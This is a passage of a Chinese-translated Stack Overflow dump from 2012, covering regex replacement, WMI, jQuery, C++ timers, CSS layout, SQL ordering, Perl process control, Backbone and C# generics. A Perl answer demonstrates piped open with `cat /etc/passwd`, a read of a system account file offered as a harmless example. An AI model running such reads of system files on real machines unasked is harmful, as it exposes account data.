TypeById("bFirstName", "Don"); 
```

我想用这样的东西替换文本：

```
Type("bPhone3", "9999", Selector.Name);
Type("bFirstName", "Don", Selector.Id); 
```

我正在这样做进行数百次更改，因此“快速替换”是我现在唯一真正的选择。我需要找到一种方法将任何内容保留在引号中并更改其周围的文本。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-26T20:58:31.553

所以我在修改 Visual Studio 的查找和替换选项，这实际上可以使用 RegEx 和标记表达式。我使用了它，它适用于您列出的字符串。

> 找什么：`TypeBy{(.*)}\({"[^"]*"}, {"[^"]*"}\);`
> 
> 用。。。来代替：`Type(\2, \3, Selector.\1);`

记得标记“使用正则表达式”，你应该是金色的

有关标记表达式的更多信息，请参见[此处](http://blogs.msdn.com/b/zainnab/archive/2010/09/12/replace-in-files-tagged-expressions-vstipfind0016.aspx)

编辑：更新了一点，因为我注意到您同时拥有姓名和 ID，可能需要根据您想要更改的其他小怪癖进行一些其他更改。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-26T20:57:06.240

您可以使用 Visual Studio 中的正则表达式查找和替换：

查找：`TypeByName\((\".+?\"),\ (\".+?\")\);`
替换：`Type($1, $2, Selector.Name);`

这会
`TypeByName("bPhone3", "9999");`变成
`Type("bPhone3", "9999", Selector.Name);`

**编辑**
你也可以这样做：

查找：`TypeBy(.+)\((\".+?\"),\ (\".+?\")\);`
替换：`Type($2, $3, Selector.$1);`

哪个会
`TypeByName("bPhone3", "9999");`变成
`Type("bPhone3", "9999", Selector.Name);`
**AND**
`TypeById("bFirstName", "Don");`成
`Type("bFirstName", "Don", Selector.Id);`

它基本上变成`TypeBy{1}({2}, {3})`了`Type({2}, {3}, Selector.{1})`

**请注意，我在 VS2012 中对此进行了测试，对于 VS2010 可能有所不同**

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T20:37:51.887

也许您正在寻找一个重构引擎，您可以在其中右键单击一个符号，然后转到`refactor`然后`rename`

对于您的特定解决方案，您也可以从重构开始，然后玩弄默认参数

```
public void Type(string str1, string str2, string str3 = "Default String")
{ 
    ... 
```

# windows - 枚举本地组成员身份时如何从本地计算机获取域用户 SID

> ID：13572685
> 
> 赞同：2
> 
> 时间：2012-11-26T20:33:29.297
> 
> 标签：windows, wmi, wmi-query

我正在枚举 Windows 加入域的机器上的本地组。我正在使用 WMI 来执行此操作，因为它非常远程且供应凭证友好。在我的场景中，我的代码始终作为不受信任的主体远程运行，这意味着我*必须*能够在对目标计算机的远程调用中提供凭据（这听起来很随机，但实际上稍后会相关）。

我正在执行以下形式的 WMI 查询：

```
SELECT PartComponent FROM Win32_GroupUser WHERE GroupComponent="Win32_Group.Domain='{0}',Name='{1}'" 
```

在这种情况下，域是计算机名称，名称是组本身的名称。

我返回的项目列表是正确的，但每个条目都缺少相关主体的 SID。为这些用户获取 SID 的最有效方法是什么？

我可以通过对每个主体的另一个查询（或对此进行明显的优化）来做到这一点，我很乐意为这个盒子上的本地用户做这件事。但是，对于域用户而言，这意味着与此主体所在域中的 DC 的另一个连接，并且可能有许多连接，因为在此本地组中可能有来自许多受信任域的用户。

我查看了一些明显的其他 API，但没有发现一个对我的事业超级友好的 API。一些，比如使用带有 WinNT://ComputerName/GroupName 形式的路径的 DirectoryEntry()，Group 事件甚至从结果中发出返回的域主体，我发现这很疯狂。其他人不提供友好的凭据，即使他们返回我所追求的组成员身份数据。

说实话，我对 SID 非常满意。主体名称和域名，虽然我觉得它们很方便，但对我来说很不错。

有没有我想念的灵丹妙药？

# jquery - JQuery .hasClass 更改子元素上的 css

> ID：13572687
> 
> 赞同：0
> 
> 时间：2012-11-26T20:33:32.683
> 
> 标签：jquery

我想通过使用其 ID 并检查它是否具有特定类来验证 div 的类。如果该属性被证明是真的，那么我想在正在验证的 DIV 内的子元素上设置 css。我怎么做？

```
$('#kwick_4').hasClass('active').css('background-position', '0px'); 
```

要设置的css，应该设置在div的image子元素上：

```
#kwick4 img 
```

我怎么做？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-26T20:35:59.560

`hasClass`返回一个布尔值，您可以改用类选择器：

```
$('#kwick_4.active').css('background-position', '0px'); 
```

如果要设置`img`元素的样式，可以编写代码：

```
$('#kwick_4.active img').css('property', 'value'); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T20:35:08.837

```
var quick = $('#kwick_4');

if(quick.hasClass('active')){
    quick.find('img').css('background-position', '0px');
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-26T20:35:26.910

```
if ( $('#kwick_4').hasClass('active') ) {
   $('#kwick_4 img').css('background-position', '0px');
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-26T20:36:38.407

```
var $elem = $('#kwick_4');

if($elem.hasClass('active')){
    $elem.find('img').css('background-position', '0px');
} 
```

或者

简单地

```
 $('#kwick_4.active img').css('background-position', '0px'); 
```

# c++ - c++每5分钟调用一次函数

> ID：13572690
> 
> 赞同：0
> 
> 时间：2012-11-26T20:33:36.547
> 
> 标签：c++, while-loop

我想每
尝试5 分钟调用一次函数

```
AutoFunction(){
    cout << "Auto Notice" << endl;
    Sleep(60000*5);
}

while(1){

    if(current->tm_hour == StartHour && current->tm_min == StartMinut && current->tm_sec == StartSec){
        CallStart();
    }

    AutoFunction();
    Sleep(1000);
} 
```

`while`我想每 1 秒同时刷新一次`call AutoFunction()`；每 5 分钟一次，但无需等待`Sleep`AutoFunction

因为我必须每 1 秒刷新一次 while(1) 以检查启动另一个函数的时间

我想这样做

```
while(1){

    if(current->tm_hour == StartHour && current->tm_min == StartMinut && current->tm_sec == StartSec){
        CallStart();
    }

    Sleep(1000);
}
while(1){

    AutoFunction();
    Sleep(60000*5);
} 
```

但我不认为他们会一起工作

谢谢你

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T21:04:12.213

对于我们这些不熟悉线程和 Boost 库的人来说，这可以通过一个 while 循环来完成：

```
void AutoFunction(){
    cout << "Auto Notice" << endl;
}

//desired number of seconds between calls to AutoFunction
int time_between_AutoFunction_calls = 5*60;

int time_of_last_AutoFunction_call = curTime() - time_between_AutoFunction_calls;

while(1){
    if (should_call_CallStart){
        CallStart();
    }

    //has enough time elapsed that we should call AutoFunction?
    if (curTime() - time_of_last_AutoFunction_call >= time_between_AutoFunction_calls){
        time_of_last_AutoFunction_call = curTime();
        AutoFunction();
    }
    Sleep(1000);
} 
```

在这段代码中，`curTime`是我编写的一个函数，它以 int 形式返回 Unix Timestamp。从您选择的时间库中替换任何合适的内容。

# css - 如何使 DIV 成行内联块？

> ID：13572691
> 
> 赞同：2
> 
> 时间：2012-11-26T20:33:43.880
> 
> 标签：css, positioning

我想要完成的是我不熟悉的东西——CSS 定位。我在 Codecademy.com 上学到了很多关于 HTML/CSS 的知识，但是对于 Joomla 的模板我有点困惑。

我试图模仿的是在这个页面上看到的 3 个 div 的行：[http](http://www.theremixologists.com/props) ://www.theremixologists.com/props - 我只是不知道如何像他们一样指定每行 3 个内容内联块有名字（Alicia & Mat、Richard & Jennifer、Kirsten & Jon）- 3 对 | 5 下

这是我要复制的模型：

[http://i.imgur.com/qzPQO.jpg](http://i.imgur.com/qzPQO.jpg)

跨越 3 个 div，然后在下面添加新的 div 行。

到目前为止，我认为我应该做的事情如下：

通过所见即所得编辑器粘贴到特定 Joomla 页面的 HTML 示例代码（我将将此代码添加到通用 Joomla 创建的页面）：

```
<div class="box_row1">  
<p>This is sample text for the first content box</p>  
</div>  
<div class="box">  
<p>This is sample text for the second content box</p>  
</div>  
<div class="box">  
<p>This is sample text for the third content box</p>  
</div> 
```

然后将 CSS 粘贴到 custom.css 中（用于模板）：

```
.box_row1 {  
 display: inline-block;  
 height: 100px;  
 width: 100px;  
 border-radius: 6px;  
 margin: 10px 10px 10px 10px;  
 } 
```

然后为第二行和第三行创建类（但是如何使它们成为行）？

我只是不确定如何开始一个新的 3 div 行。CSS 定位本身就是一门科学。这些 3x15 块实际上是表格，还是网格模块？任何帮助，将不胜感激！谢谢

编辑：用 Firebug 检查他们的页面向我展示了每个块的这个片段：

.fullwidth .one_third{width:256px;}

我只是不明白如何制作 div 行。CSS 定位让我很困惑哈哈。乐叹息。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:37:18.977

我不确定你在这里想要什么，我假设你想要制作所有 3 个 div`inline`而你只是制作 1 as `inline`，这不是`positioning`问题，这是一个`display`问题，所以给你的每个 div 一个通用类，比如

```
.div_common {  
 display: inline-block;  
 height: 100px;  
 width: 100px;  
 border-radius: 6px;  
 margin: 10px 10px 10px 10px;  
} 
```

```
<div class="div_common">  
 <p>This is sample text for the first content box</p>  
</div>  
<div class="div_common">  
 <p>This is sample text for the second content box</p>  
</div>  
<div class="div_common">  
 <p>This is sample text for the third content box</p>  
</div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:38:26.920

这是他们正在做的事情

```
<div class="big_box">
    <div class="box">  
        <p>This is sample text for the first content box</p>  
    </div>  
    <div class="box">  
        <p>This is sample text for the second content box</p>  
    </div>  
    <div class="box">  
        <p>This is sample text for the third content box</p>  
    </div>
</div>
<div class="clear"></div> 
```

现在的CSS

```
.clear {
    clear:both;
}
.big_box {
    width:600px;
}
.big_box .box {
    float:left;
    width:196px;
} 
```

# sencha-touch - Sencha touch 不使用控制器显示视图

> ID：13572692
> 
> 赞同：0
> 
> 时间：2012-11-26T20:33:53.200
> 
> 标签：sencha-touch, sencha-touch-2

我的控制器中有以下代码，并试图简单地切换视图。谁能解释如何让视图显示。

```
Ext.define('MyApp.controller.HomeController', {
    extend: 'Ext.app.Controller',

    config: {
        views: [
            'Home',
            'ChangeEmailView'
        ],

        refs: {
            changeEmailView: {
                selector: '#btnChangeEmail',
                xtype: 'ChangeEmailView'
            }
        }
    },

    init: function(application) {
        alert("init");
    },

    launch: function() {
        alert("launch");
    }

}); 
```

看法：

```
Ext.define('MyApp.view.ChangeEmailView', {
    extend: 'Ext.Panel',
    alias: 'widget.ChangeEmailView',

    config: {
        items: [{
            xtype: 'toolbar',
            docked: 'top',
            ui: 'light',
            title: 'Change Email Address'
        }]
    }
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T20:50:24.167

最简单的方法如下：

```
showChangeEmailView: function () {
    Ext.Viewport.add(this.getChangeEmailView());
    this.getChangeEmailView().show({
        type:'slide',
        direction:'up'
    });
} 
```

[这是一个例子](http://www.senchafiddle.com/#z1DaQ)

但这实际上取决于您的应用程序结构。也许您正在使用 NavigationView，然后您需要推送视图。

希望这有帮助

# sql - 获取最后一次发生（如果 1+ 发生）或第一次安排（如果没有发生）

> ID：13572696
> 
> 赞同：0
> 
> 时间：2012-11-26T20:34:14.633
> 
> 标签：sql, sql-server, sql-order-by

我在 SQL Server 中有一个代表医生/患者遭遇的表。其中一列是表示相遇开始时间的日期时间字段。还有另一个字段表示相遇的预定时间。

我正在尝试编写一个查询来隔离满足以下条件的一次遭遇（对于给定的一天）：

1.  如果任何遭遇已经开始，最后一次遭遇开始， - 或 -
2.  如果没有开始相遇，则第一次预定的相遇

所以，我有点想要以下内容：

```
SELECT 
    TOP 1 * 
FROM 
    TABLE 
ORDER BY 
    CASE WHEN STARTED IS NULL THEN 0 ELSE 1 END DESC, 
    IF STARTED IS NULL
        SCHEDULED ASC
    ELSE
        STARTED DESC 
```

我意识到我不能完全做到这一点，但我想知道我是否错过了其他方法来做到这一点。

其他信息：

1.  所有要比较的遭遇将发生在同一日历日。
2.  这是一个更大的查询的一部分，我按发生/安排相遇的房间进行分区。
3.  只要我能准确地识别出那一次遭遇，我就不关心那个房间里的其他遭遇。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:56:54.000

尝试这样排序：

```
SELECT 
    TOP 1 * 
FROM 
    TABLE 
ORDER BY 
    CASE WHEN STARTED IS NULL THEN 0 ELSE 1 END, 
    STARTED DESC, 
    SCHEDULED ASC 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T21:02:48.573

从 Johann 那里得到了排序方法

```
Select Top 1
  *
From (
  Select
    0 As X,
    *
  From
    Encounter
  Where
    -- started after 00:00:00 today (maybe Started > GetDate() will suffice)
    Started >= DateAdd(day, DateDiff(day, 0, GetDate()), 0) And 
    -- started before 00:00:00 tomorrow
    Started < DateAdd(day, 1 + DateDiff(day, 0, GetDate()), 0)
  Union All
  Select
    1 As X,
    *
  From
    Encounter
  Where
    -- Sechduled after 00:00:00 today
    Scheduled >= DateAdd(day, DateDiff(day, 0, GetDate()), 0) And 
    -- started before 00:00:00 tomorrow
    Scheduled < DateAdd(day, 1 + DateDiff(day, 0, GetDate()), 0) 
  ) a
Order By
  X,
  Started Desc,
  Scheduled Asc 
```

假设开始总是与预定的同一天，并且预定不能为空，这相当于：

```
Select Top 1
  *
From
  Encounter
Where
  -- Sechduled after 00:00:00 today
  Scheduled >= DateAdd(day, DateDiff(day, 0, GetDate()), 0) And 
  -- started before 00:00:00 tomorrow
  Scheduled < DateAdd(day, 1 + DateDiff(day, 0, GetDate()), 0) 
Order By
  Case When Started Is Null Then 0 Else 1 End,
  Started Desc,
  Scheduled; 
```

[http://sqlfiddle.com/#!3/9cc65/3](http://sqlfiddle.com/#!3/9cc65/3)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:42:08.777

我不确定我的问题是否特别清楚，但根据我的场景的具体标准，答案比我想象的要容易得多。

基本上，归结为我想将行分成两组：

1.  STARTED 列中具有非空值的行，以及
2.  STARTED 列中具有空值的行。

同样重要的是，在 SCHEDULED 字段中总是有一个有效值。

我想按组 #1 的 STARTED 值按降序排序，组 #2 按其 SCHEDULED 值按升序排序。

然后，我想要第 1 组的第一个条目，或者 - 如果第 1 组为空 - 来自第 2 组的第一个条目。没有其他条目对这个问题很重要。

因为组 #1 需要按降序排序，所以我使用了以下解决方案：

```
SELECT 
    TOP 1 * 
FROM 
    TABLE 
ORDER BY 
    STARTED DESC,
    SCHEDULED ASC 
```

在我的测试中，如果所有行都有一个空的 STARTED 值，这会给我具有最新 STARTED 值的行，或者具有最早 SCHEDULED 值的行。

# sql - 在 DB2 中选择期间 SQLCODE= -9999

> ID：13572701
> 
> 赞同：0
> 
> 时间：2012-11-26T20:34:22.633
> 
> 标签：sql, db2, sqlcode

第一次使用 DB2，我偶尔会从各种存储过程中获得 SQLCODE=-9999 的失败 sql 状态。频率各不相同，今天相当频繁，所以我想在等待它再次工作时，我会尝试找出发生了什么。谷歌未能帮助我确定错误代码的含义，所以我希望这里的人已经看到它并能提示我。

其他开发人员之一告诉我这只发生在测试环境中，但在集成环境中看不到。我使用的存储过程都没有提升到集成环境，所以我假设这个问题之前已经被看到并且被忽略了，因为它是“唯一的”测试。

这是错误消息：

```
IBM.Data.DB2.DB2Exception (0x80004005): ERROR [08506] [IBM][DB2] SQL30108N  
A connection failed but has been re-established. Special register settings 
might have been replayed. Host name or IP address of the 
new connection: "192.168.252.156". Service name or port number of the 
new connection: "446".  Reason code: "1". 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T17:56:56.717

根据有关此错误的[信息中心页面](http://pic.dhe.ibm.com/infocenter/db2luw/v10r1/topic/com.ibm.db2.luw.messages.sql.doc/doc/msql30108n.html)（链接适用于 Linux/Unix/Windows v10.1，因为您没有提到平台），并且正如消息中提到的那样，连接因“某种原因”而失败，并且它被重新建立。

错误页面上没有大量帮助：

> **用户响应**
> 
> 应用程序负责重建会话资源。应用程序必须重新发出所有已回滚的操作。

# data-cleaning - 如何使用 Google Refine 将字符串值替换为指纹？

> ID：13572704
> 
> 赞同：2
> 
> 时间：2012-11-26T20:34:33.573
> 
> 标签：data-cleaning, fingerprinting, google-refine

我有一列包含 100,000 多个字符串。我希望 Google Refine 用他们的指纹替换这些字符串。

我在 Google Refine 中选择了该列，并创建了一个 Text Facet。从该文本方面，我可以选择“集群”。这将向我显示集群，我假设这意味着具有相同指纹的字符串值，并允许我选择一个新单元格值，它默认为集群的第一个成员的名称。

我希望这个名字只是指纹。原因是，我需要对多个文件执行此操作，如果它们确实属于同一个集群，我需要它们具有相同的值。我无法连接文件，因为这会导致 Refine 处理的数据过多，尽管根据 Refine FAQ 优化了内存参数。

所以我只是在寻找一个操作，它获取列中的每个单元格，计算其指纹，并用其指纹替换列中的值。

我在 OSX 10.7 上使用 Google Refine 2.5

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-27T18:55:57.660

具有数千种选择的文本方面将使您的浏览器陷入困境。如果您仅将构面用作访问集群的一种方式，则可以通过使用来获得相同的功能`Edit Cells -> Cluster and Edit`

要计算指纹，请使用恰当命名的指纹函数，即`value.fingerprint()`尽管我建议添加一个新列而不是覆盖您的原始值，以防您再次需要它们。

# powershell - 将脚本位置保留在终端中

> ID：13572705
> 
> 赞同：0
> 
> 时间：2012-11-26T20:34:37.887
> 
> 标签：powershell, tui

我想编写一个显示几行（可能是 5 行）的 Powershell 脚本，但它们在终端窗口中保持在相同的位置/位置。例如：如果我正在编写一个脚本，如果有几个设备可以 ping，则打印，我不希望输出继续向下滚动终端；我希望每条线都保持在它们所在的位置，但会随着时间的推移而更新。

前任：

```
+----------------------+    +----------------------+
|       TERMINAL       |    |       TERMINAL       |
+----------------------+    +----------------------+
| Device1: PINGABLE    |    | Device1: NOT PINGABLE|
| Device2: NOT PINGABLE|    | Device2: NOT PINGABLE|
|                      |    |                      |
|                      |    |                      |
|                      |    |                      |
|                      |    |                      |
+----------------------+    +----------------------+ 
```

脚本继续运行，行保持在同一位置，并且输出会在必要时更新。我如何在 Powershell 中实现这一点？

我刚刚发现这个论坛帖子更清楚地概述了我的问题：http: [//www.minasi.com/forum/topic.asp? TOPIC_ID=29171](http://www.minasi.com/forum/topic.asp?TOPIC_ID=29171)

现在还是这样吗？还是不行吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:56:56.560

看看`$host.UI.RawUI`具体`$host.UI.RawUI.SetBufferContents(...)`。

# linux - 反向正常运行时间监视器

> ID：13572707
> 
> 赞同：1
> 
> 时间：2012-11-26T20:34:45.467
> 
> 标签：linux, ubuntu, process, monitoring, upstart

有很多工具可以检查您的网站正常运行时间。我正在寻找一种相反的工具……也就是说，我每分钟向第 3 方发送一条消息，如果它错过了一条消息，它会提醒我。

我的问题是我有一个长时间运行的进程，一天随机挂起。我无法深入了解它，从那以后它就没有发生过，但我想监控它。我在 Ubuntu 上使用 upstart 来监控进程并在它崩溃时重新启动它......问题是它没有崩溃只是挂起。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-26T03:08:31.083

对于反向正常运行时间监控服务，[https://deadmanssnitch.com](https://deadmanssnitch.com)就是其中之一。

作为有效监控流程的建议，请尝试以下方法之一：

*   [认识的](https://github.com/Gurpartap/cognizant)
*   [上帝](http://godrb.com)
*   [蓝丸](https://github.com/arya/bluepill)
*   [主管](http://supervisord.org)
*   [监控](http://mmonit.com/monit/)

# cordova - 在phonegap中安装jquery mobile

> ID：13572708
> 
> 赞同：0
> 
> 时间：2012-11-26T20:34:48.917
> 
> 标签：cordova, jquery-mobile

> **可能重复：**
> [一起使用 JQuery-Mobile/Phonegap 的正确方法？](https://stackoverflow.com/questions/10945643/correct-way-of-using-jquery-mobile-phonegap-together)

我是否必须将 jquery mobile 安装到 phonegap 中才能将其包含在 APK 文件中？我在 HTML 文件中使用 google jquery 库，并希望他的应用程序也可以离线运行。

phonegap 也工作得很慢，还有其他人正在经历这个吗？

多谢...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:52:55.980

您不需要安装它，只需按照教程将 jQM 文件复制到 assets/www 目录并重建 android 项目，以便它可以适应 phonegap 库。

[本](http://mobile.tutsplus.com/tutorials/mobile-web-apps/jquery_android/)教程将帮助您学习如何创建 apk 文件，但从您的第二个问题我想您知道该怎么做。

关于你的第二个问题，缓慢不是因为phonegap，而是因为jQuery mobile。对于移动设备来说，它仍然是一个相当缓慢的框架。iPhone 5+ 是 jQM 目前最好的移动平台，仅适用于 android 4+ 版本。看看[这张](http://jsperf.com/jquery-vs-createelement)图，它们代表了手机浏览器和桌面版本之间的 jQuery 性能差异。请注意手机和桌面浏览器之间的差异，这是 phonegap 缓慢的主要原因。

# multithreading - 如何从 Perl 运行进程并捕获输出和返回代码？

> ID：13572710
> 
> 赞同：0
> 
> 时间：2012-11-26T20:34:55.450
> 
> 标签：multithreading, perl, process, fork

我想在 Perl（命令行 PHP 脚本）中运行一个单独的进程。我想捕获这个过程的输出和返回代码。或者，如果该过程花费的时间超过 N 秒，我希望能够终止该过程并继续前进。我应该调查什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:37:13.600

你可以试试[IPC::Run](http://search.cpan.org/~toddr/IPC-Run-0.92/lib/IPC/Run.pm)。

> IPC::Run - 带有管道、redirs、ptys（Unix、Win32）的系统（）和后台进程

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-26T23:44:19.500

就个人而言，我发现最简单的是带有[AnyEvent](https://metacpan.org/module/AnyEvent) [::Util](https://metacpan.org/module/AnyEvent%3a%3aUtil) ::run_cmd 和计时器的 AnyEvent。这里不需要在事件循环下运行整个程序，我今天经常使用这个解决方案进出事件循环。（以下不是警告安全的。）

```
use AnyEvent;
use AnyEvent::Util;

my ($stdout, $stderr, $pid);

my $cv = AnyEvent::Util::run_cmd [ $^X, -e => '$|++; sleep 2; print "foo\n"; sleep 2' ],
    '>'  => \$stdout,
    '2>' => \$stderr,
    '$$' => \$pid,
;

my $w = AnyEvent->timer(after => 3, interval => 0, cb => sub { print "killing!\n"; kill SIGINT => $pid });

my $rc = $cv->recv();
$w = undef; # end the timer.

print "got rc = [$rc]\n";
print "stdout = [$stdout]\n";
print "stderr = [$stderr]\n"; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-26T21:08:07.647

```
use IPC::System::Simple qw/EXIT_ANY $EXITVAL capture/;

my $output = capture(EXIT_ANY, 'some command');
print "exit value was $EXITVAL\n"; 
```

`EXIT_ANY`告诉捕获允许任何退出值；您可以改为列出允许的 ( `capture([0,1,42], ...)`)，如果遇到另一个异常，捕获将引发异常。默认情况下（如果只传递一个命令来捕获）任何非零退出值都会导致异常。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-27T08:49:33.803

这是一个经常被问到的问题。也看看这个[Perl FAQ](http://perldoc.perl.org/perlfaq8.html#How-can-I-capture-STDERR-from-an-external-command?)。它基本上解释了在 Perl 中运行外部命令的方式。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-26T20:47:54.033

您可以使用 piped **open()**来获得所有 3 个目标：

```
my $pid = open(F, "cat /etc/passwd |") || die "Cant open pipe: $!";
eval {
     # Give 30 secs to read output:
     local $SIG{ALRM} = sub { kill(9, $pid); die "alarm\n"; }; # NB: \n required
     alarm(30);

     # Read output:
     my $line = <F>;
     alarm(0); # Remove alarm

     #..do job with $line
};
# Get errorcode:
close(F);
print "Exit status: $?\n";
printf "Exit value(return code): %d\n", $?>>8;
print "Killed by timeout\n" if ($? & 127)==9; 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-03-03T10:25:17.393

在不考虑问题的可选部分的情况下，您可以在反引号中获取命令的输出，并在特殊变量中获取其返回值`$?`。

```
my $output = `shell_command`;
die ("shell_command failed!\n") if ($?); 
```

# c# - 通过脚本在 onmousewheel 事件中使用 wheelDelta#

> ID：13572711
> 
> 赞同：0
> 
> 时间：2012-11-26T20:34:57.823
> 
> 标签：c#, javascript, mouseevent, mousewheel, script#

`ElementEvent`我在带有参数的 Script# 中使用鼠标事件。`WheelDelta`但是我在这个事件的论点中找不到属性`onmousewheel`。怎么可能使用这个属性？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T14:02:57.973

我通过引入以下类型和方法（使用 Script# 0.7.5）解决了我的问题：

```
[Imported]
public static class Global
{
    [IntrinsicProperty, ScriptAlias("e.wheelDelta")]
    public static int WheelDelta
    {
        get { return 0; }
    }
} 
```

如果`onmousewheel`我只是粘贴`Global.WheelDelta`我想访问 wheelDelta 的位置。

对于 Script# (>= 0.8) 的更多最新版本，应`Imported`使用`ScriptImport`和`IntrinsicProperty`替换`ScriptField`。

# javascript - Backbone.sync 覆盖 dataType

> ID：13572712
> 
> 赞同：4
> 
> 时间：2012-11-26T20:35:08.103
> 
> 标签：javascript, jquery, backbone.js

我正在构建一个使用 .CSV 文件作为主干模型数据源的应用程序。覆盖同步以使用数据类型“文本”而不​​是“json”的最佳方法是什么？寻找最佳实践等...

不幸的是，Backbone.sync 使用的“dataType”参数是硬编码的......并且不响应 options.dataType。有问题的代码可以在带注释的源中看到 - [http://backbonejs.org/docs/backbone.html#section-166](http://backbonejs.org/docs/backbone.html#section-166)

这是我在模型上创建的同步方法。其中大部分是直接从 Backbone.sync 复制粘贴。我的模型也是只读的。

```
sync: function(method, model, options){

    //overwrite sync to read a .CSV document. if
    //the default Backbone sync would let you
    //specify the "dataType" property, this wouldn't
    //be necessary.

    if(method === 'read'){

        options || (options = {});

        var success = options.success;
        options.success = function(resp, status, xhr) {
            if (success) success(json, status, xhr);
        };

        var params = {type: 'GET', dataType: 'text', url: this.url};
        return $.ajax(_.extend(params, options));
    }
}, 
```

我已经覆盖了“解析”来处理 CSV 响应。

```
parse: function(data, xhr){
    return $jQuery.parseJSON( CSVParser.toJSON(data) );
}, 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:57:36.853

无需更改主干的核心，或复制整个同步方法来更改数据类型，您可以使用 jQuery 的一个不太知名的函数，称为[ajaxPrefilter](http://api.jquery.com/jQuery.ajaxPrefilter/)。

Witch 允许您在创建之前更改 ajax 请求。很需要的功能。

```
jQuery.ajaxPrefilter(function( options ) {
    options.dataType = "mynewdatatype";
}); 
```

* * *

我不确定这是否适用于 zepto.js。

# java - 如何为 Oracle JDBC 瘦驱动程序设置环境变量

> ID：13572714
> 
> 赞同：2
> 
> 时间：2012-11-26T20:35:13.737
> 
> 标签：java, database, oracle, jdbc

在我的系统上安装 Oracle 11g R2 后，我将环境变量设置如下：

```
variable Name :CLASSPATH 
variable Value :E:\app\JamesPJ\product\11.2.0\dbhome_1\jdbc\lib\ojdbc6.jar
Variable name : ORACLE_HOME
varaible value :E:\app\JamesPJ\product\11.2.0\dbhome_1\jdbc\lib\ojdbc6.jar 
```

当我使用 testpad 并在命令提示符下运行程序时，错误如下：

> 错误：无法找到或加载主类测试

这是如何引起的，我该如何解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:46:54.167

Java 在类路径中查找所有类。但是，您已将类路径设置为单个固定 JAR 文件，即 JDBC 驱动程序本身。这个 JAR 文件肯定不包含您自己的`test.class`文件。如果您`test.class`在当前工作目录中可用，则应该已将当前工作目录添加`.`到类路径中。

```
.;E:\app\JamesPJ\product\11.2.0\dbhome_1\jdbc\lib\ojdbc6.jar 
```

请注意，类路径中的路径在 Windows 中以分号分隔，在 *nix 中以冒号分隔。

或者，您也可以在执行期间通过`-cp`参数控制类路径。这样环境变量将被完全忽略。

```
java -cp .;E:\app\JamesPJ\product\11.2.0\dbhome_1\jdbc\lib\ojdbc6.jar test 
```

为了避免每次都重新输入整个命令的繁琐工作，请将其放入`.bat`or`.cmd`文件中并改为执行它。

# c# - 在 C# 中传递派生对象的集合

> ID：13572719
> 
> 赞同：4
> 
> 时间：2012-11-26T20:35:29.880
> 
> 标签：c#, inheritance, collections

我仍然对 OO 和 C# 感到困惑。我确信这是一个简单的问题，我想我知道答案，但我想确定一下。

如果我有一个名为的类`Car`和另一个`Ford`继承自的类`Car`，以及另一个`Mustang`继承自该类的`Ford`类。

创建一个接受`Car`对象集合的方法，然后当我调用该方法时实际上将`Mustang`（或`Ford`）对象的集合传递给该方法，因为它们实际上是`Car`对象，是否可以接受/可能？

我的想法是这应该是可能的，因为我知道我只能访问`Car`类的 Properties\Methods。我是否基于此？

另外，如果我是对的，您可以这样做：您是否需要在调用该方法时将`Mustang`集合转换为集合？`Car`

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-26T20:38:27.083

不，那是不可能的。

因此，如果我们有一个接受`List<Car>`类型的函数。显然，该函数应该能够将 a 添加`Prius`到该列表中，不是吗？好吧，如果您被允许将 a 传递`List<Mustang>`给此方法，那么您只是将 a 添加`Prius`到 a `List<Mustang>`，显然那会很糟糕。

`List`现在，如果该方法不是传递 a ，而是`IEnumerable`具有某个其他只读集合类型的参数或其中一个参数，那么它可能是“协变的”。在这种情况下，作为示例，您可以接受 an`IEnumerable<Car>`并传递它，`List<Mustang>`因为您从不添加到列表中，您只是访问各种元素，并且只要所有`Mustang`对象都是`Car`没有问题的对象。

设计也似乎有点……过时了。我不认为`Ford`应该继承自`Car`. `Ford`不是汽车，它是一个品牌、一个公司、一种汽车。 `Mustang` **是一辆**车，所以从一个继承它是有意义的。我会创建一个新类型，比如说`Manufacturer`您可以创建`Ford`,`Toyota`等，并将其设为 . 的（只读）属性`Car`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T20:45:06.500

其他人已经解释了将 Mustangs 集合作为参数发送到不同方法的各个方面，然后我将添加一些您可能会觉得有用的信息。

如果您有一系列汽车`List<Car>`，您只能通过以下方式获得野马：

```
IEnumerable<Mustang> mstngs = cars.OfType<Mustang>();
List<Mustang> mstngsLst = mstngs.ToList(); 
```

如果您有一系列野马`List<Mustang>`，您可以将它们全部投入汽车：

```
IEnumerable<Car> cars = mstngs.Cast<Car>();
List<Car> carsLst = cars.ToList(); 
```

